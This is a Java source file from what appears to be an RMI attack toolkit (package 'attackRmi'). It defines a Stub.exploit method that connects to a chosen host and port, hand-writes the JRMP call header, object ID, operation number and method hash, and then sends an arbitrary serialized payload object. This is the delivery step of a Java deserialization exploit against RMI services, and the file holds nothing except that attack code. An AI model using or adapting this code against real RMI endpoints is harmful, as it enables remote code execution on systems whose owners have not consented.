package com.wu.attackRmi.utils;


import sun.rmi.transport.TransportConstants;

import javax.net.SocketFactory;
import java.io.DataOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.rmi.server.ObjID;

public class Stub {

    public static void exploit ( String hostname, int port, Object payloadObject, ObjID objid, int opnum, Long hash ) throws Exception {
        Socket s = null;
        DataOutputStream dos = null;
        try {
            s = SocketFactory.getDefault().createSocket(hostname, port);
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            final ObjectOutputStream objOut = new MarshalOutputStream(dos);


            objid.write(objOut); //Objid

            objOut.writeInt(opnum); // opnum
            objOut.writeLong(hash); // hash

            objOut.writeObject(payloadObject);

            os.flush();
        }
        finally {
            if ( dos != null ) {
                dos.close();
            }
            if ( s != null ) {
                s.close();
            }
        }
    }
}
